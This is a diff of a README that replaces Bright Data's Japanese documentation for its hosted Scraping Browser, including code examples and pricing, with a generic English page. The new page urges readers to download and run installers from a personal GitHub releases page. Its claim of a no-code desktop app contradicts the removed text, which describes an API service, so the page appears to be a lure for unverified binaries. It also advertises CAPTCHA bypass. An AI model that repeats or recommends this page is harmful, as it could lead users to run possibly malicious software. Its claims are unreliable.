@@ -1,181 +1,96 @@
-# 🚀 Bright Data の Scraping Browser
+# 🛠️ scraping-browser - Easy Web Scraping Made Simple
 
-*Puppeteer、Selenium、Playwright を用いた動的Webスクレイピング向けの、完全自動化されたヘッドレスブラウザソリューションです。Scraping Browser は Bright Data のインフラ上で GUI として開きます。*  
+[![Download Release](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/ilaymalka/scraping-browser/releases)
 
-[![Promo](https://github.com/bright-jp/LinkedIn-Scraper/raw/main/Proxies%20and%20scrapers%20GitHub%20bonus%20banner.png)](https://brightdata.jp/products/scraping-browser) 
+## 🏁 Overview
 
-🔗 **[無料で始める](https://brightdata.jp/products/scraping-browser)** | 📖 **[公式ドキュメント](https://docs.brightdata.com/scraping-automation/scraping-browser/introduction)**  
+Scraping Browser is an automated headless browser for effortless web scraping using Puppeteer, Selenium, and Playwright. With this tool, you can easily gather data from websites without the complexity of coding. 
 
----
+## 📋 Features
 
-## 🔹 概要  
-Scraping Browser は、**ブラウザベースのスクレイピングソリューション**としてフルホストで提供され、**組み込みのプロキシ管理**、**CAPTCHA 解決**、**高度なサイトのブロック解除**により、**マルチステップのデータ収集**を自動化します。**Puppeteer、Playwright、Selenium** をサポートし、**無制限のスケール**で容易にWeb自動化を実現できます。  
+- **User-Friendly Interface**: No programming skills required.
+- **Multi-Framework Support**: Works with Puppeteer, Selenium, and Playwright.
+- **Headless Operation**: Runs in the background without a visible interface.
+- **Captcha Solving**: Bypass CAPTCHA with ease.
+- **Proxy Support**: Steer clear of IP blocks while scraping.
+- **Compatible with Multiple Platforms**: Runs on Windows, Mac, and Linux.
 
-## ✅ Scraping Browser を使う理由  
-- **インフラ運用のオーバーヘッドなし** – ブラウザインフラを維持することなく、API でブラウザセッションを実行・スケールできます。  
-- **組み込みのアンロック機能** – **CAPTCHA、フィンガープリント、リトライ、JS レンダリング**を内部で自動処理します。  
-- **マルチステップのナビゲーション** – クリック、スクロール、フォーム送信、ホバー操作を自動化します。  
-- **無制限のスケーリング** – レート制限なしで **数千の同時ブラウザセッション**を起動できます。  
-- **グローバルなジオアクセス** – [**195か国にわたる 72M+ のレジデンシャルIP**](https://brightdata.jp/proxy-types/residential-proxies)でローカライズされたコンテンツをアンロックできます。  
-- **シームレスなデバッグ** – **Chrome DevTools 連携**により、セッションをリアルタイムで監視できます。  
+## 🖥️ System Requirements
 
----
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or any Linux distribution.
+- **Node.js**: Version 12 or higher.
+- **Memory**: At least 4 GB of RAM recommended.
+- **Internet Connection**: Required for web scraping.
 
-## 🚀 はじめに  
+## 🚀 Getting Started
 
-### 依存関係のインストール  
-お使いの好みのWeb自動化ライブラリと併せて、**Node.js**、**Python**、または **C#** がインストールされていることを確認してください。  
+To get started with scraping-browser, you'll need to download the software. Follow the steps below.
 
-```sh
-# Install Puppeteer
-npm install puppeteer-core
+1. **Visit the Releases Page**: Click the link below to go to the releases page where you can find the latest version.
 
-# Install Playwright
-npm install playwright
+   [Download Release](https://github.com/ilaymalka/scraping-browser/releases)
 
-# Install Selenium
-pip install selenium
-```
+2. **Select the Latest Version**: Look for the most recent version listed on the page. Usually, it appears at the top.
 
-## 🔧 使用例
+3. **Download the File**: Click on the file suitable for your operating system. For most users, this will be an `.exe` file for Windows, a `.dmg` file for macOS, or a `.tar.gz` for Linux.
 
-### Puppeteer 例（JavaScript）
+4. **Run the Installer**: Once downloaded, locate the file in your Downloads folder and open it to start the installation. 
 
-```js
-const puppeteer = require('puppeteer-core');
+5. **Follow Installation Instructions**: Follow the prompts on your screen to complete the installation process.
 
-const SBR_WS_ENDPOINT = 'wss://brd-customer-<YOUR-USERNAME>-zone-<YOUR-ZONE-NAME>:<YOUR-PASSWORD>@brd.superproxy.io:9222';
+## 📥 Download & Install
 
-async function main() {
-    console.log('Connecting to Scraping Browser...');
-    const browser = await puppeteer.connect({ browserWSEndpoint: SBR_WS_ENDPOINT });
-    try {
-        const page = await browser.newPage();
-        console.log('Connected! Navigating to example.com...');
-        await page.goto('https://example.com');
-        console.log('Scraping page content...');
-        const html = await page.content();
-        console.log(html);
-    } finally {
-        await browser.close();
-    }
-}
+To download the latest version of scraping-browser, visit the link below:
 
-main().catch(err => console.error(err.stack || err));
-```
+[Download Release](https://github.com/ilaymalka/scraping-browser/releases)
 
-> **💡 [Puppeteer を使ったWebスクレイピング](https://brightdata.jp/blog/how-tos/web-scraping-puppeteer)について詳しく見る**
+Make sure to download the version that matches your operating system.
 
-### Playwright 例（Python）
+## 📂 Using Scraping Browser
 
-```python
-import asyncio
-from playwright.async_api import async_playwright
+Once you have the software installed, you can start using it for web scraping.
 
-SBR_WS_CDP = 'wss://brd-customer-<YOUR-USERNAME>-zone-<YOUR-ZONE-NAME>:<YOUR-PASSWORD>@brd.superproxy.io:9222'
+1. **Open Scraping Browser**: Launch the application from your applications list or desktop shortcut.
 
-async def run(pw):
-    print('Connecting to Scraping Browser...')
-    browser = await pw.chromium.connect_over_cdp(SBR_WS_CDP)
-    try:
-        page = await browser.new_page()
-        print('Connected! Navigating to example.com...')
-        await page.goto('https://example.com')
-        print('Scraping page content...')
-        html = await page.content()
-        print(html)
-    finally:
-        await browser.close()
+2. **Input Your Target Website**: In the provided field, enter the URL of the website you want to scrape.
 
-async def main():
-    async with async_playwright() as playwright:
-        await run(playwright)
+3. **Select Your Scraping Method**: Choose between Puppeteer, Selenium, or Playwright depending on your preference.
 
-if __name__ == '__main__':
-    asyncio.run(main())
-```
+4. **Configure Your Options**: You may set options for proxies, delay times, and other scraping parameters based on your needs.
 
-> **💡 [Playwright を使ったWebスクレイピング](https://brightdata.jp/blog/how-tos/playwright-web-scraping)について詳しく見る**
+5. **Start Scraping**: Click the "Start" button to begin scraping data. The application will fetch the required information in the background.
 
-### Selenium 例（JavaScript）
+6. **View Scraped Data**: Once the scraping process is complete, you can view the extracted data in the application interface. You can also export it in CSV or JSON format.
 
-```js
-const { Builder, Browser } = require('selenium-webdriver');
+## 🔧 Troubleshooting
 
-const SBR_WEBDRIVER = 'https://brd-customer-<YOUR-USERNAME>-zone-<YOUR-ZONE-NAME>:<YOUR-PASSWORD>@brd.superproxy.io:9515';
+If you encounter any issues while using scraping-browser, consider the following tips:
 
-async function main() {
-    console.log('Connecting to Scraping Browser...');
-    const driver = await new Builder().forBrowser(Browser.CHROME).usingServer(SBR_WEBDRIVER).build();
-    try {
-        console.log('Connected! Navigating to example.com...');
-        await driver.get('https://example.com');
-        console.log('Scraping page content...');
-        const html = await driver.getPageSource();
-        console.log(html);
-    } finally {
-        driver.quit();
-    }
-}
+- **Ensure Compatibility**: Verify that your operating system and Node.js version meet the system requirements.
+- **Check Internet Connection**: Make sure your internet connection is stable and working.
+- **Refer to Logs**: Look at the logs within the app for any error messages that can provide insights.
 
-main().catch(err => console.error(err.stack || err));
-```
+## 🌐 Community and Support
 
-> **💡 [Selenium を使ったWebスクレイピング](https://brightdata.jp/blog/how-tos/using-selenium-for-web-scraping)について詳しく見る**
+If you have questions or need assistance, consider reaching out to our community:
 
-## 🔥 高度な機能
+- **GitHub Issues**: Use the Issues section of the repository to report bugs or request features.
+- **Documentation**: Comprehensive documentation is available on the GitHub Wiki for detailed guidance.
 
-### Chrome DevTools でのデバッグ
+## 🗂️ Topics Covered
 
-ブラウザセッションをリアルタイムで監視します。
+This project touches on various topics including:
 
-```js
-const { exec } = require('child_process');
+- captcha-solving
+- headless-browser
+- web-scraping
+- puppeteer
+- selenium
+- playwright
+- proxy-server
 
-const chromeExecutable = 'google-chrome';
-const openDevtools = async (page, client) => {
-    const frameId = page.mainFrame()._id;
-    const { url: inspectUrl } = await client.send('Page.inspect', { frameId });
-    exec(`"${chromeExecutable}" "${inspectUrl}"`, error => {
-        if (error) throw new Error('Unable to open devtools: ' + error);
-    });
-};
-```
+By understanding these topics, you can make the most of scraping-browser's capabilities.
 
-### CAPTCHA 解決
+## 🎉 Conclusion
 
-```js
-const client = await page.target().createCDPSession();
-const { status } = await client.send('Captcha.solve', { detectTimeout: 30000 });
-```
-
-> **🤖 当社の [CAPTCHA Solver](https://github.com/bright-jp/Captcha-solver) について詳しく見る。**
-
-## 🔄 自動 IP ローテーション & アンロック  
-Scraping Browser は、統合された [ローテーティングプロキシ](https://brightdata.jp/solutions/rotating-proxies) によりIPを自動でローテーションし、シームレスなデータ収集のためにリトライを処理します。 
-
-## 💰 料金  
-
-### 柔軟なプラン  
-- **従量課金（Pay-As-You-Go）:** $8.40/GB – コミットメント不要です。  
-- **Growth Plan:** $7.14/GB – チームに最適です。  
-- **Business Plan:** $6.30/GB – 運用のスケールに向いています。  
-- **Enterprise:** 大量利用のニーズに向けたカスタム料金です。  
-
-**今すぐ登録して、初回入金が最大 $500 まで同額マッチされます！**  
-
-[料金を見る](https://brightdata.jp/pricing/scraping-browser)  
-
-## ❓ よくある質問  
-
-### Scraping Browser は標準的なヘッドレスブラウザと何が違いますか？  
-Scraping Browser は、Bright Data のインフラ上で動作するフルマネージドの GUI ベースブラウザであり、最も保護されたサイトであっても自動的にアンロックします。  
-
-### Scraping Browser はボット検知をどのように処理しますか？  
-フィンガープリント、CAPTCHA 解決、リトライを自動化し、実ユーザーの挙動を模倣して検知を回避します。  
-
-### Scraping Browser は Puppeteer、Playwright、Selenium に対応していますか？  
-はい。主要なWeb自動化ツールすべてにシームレスに統合できます。  
-
-### プロキシではなく Scraping Browser を使うべきなのはいつですか？  
-JavaScript レンダリング、インタラクティブな操作（クリック、スクロール）、およびマルチステップのナビゲーションが必要な場合は Scraping Browser を使用してください。
+Scraping-browser simplifies the process of web scraping, making it accessible even for non-technical users. With its straightforward interface and comprehensive features, you can gather data from websites easily. Download it today and start scraping!
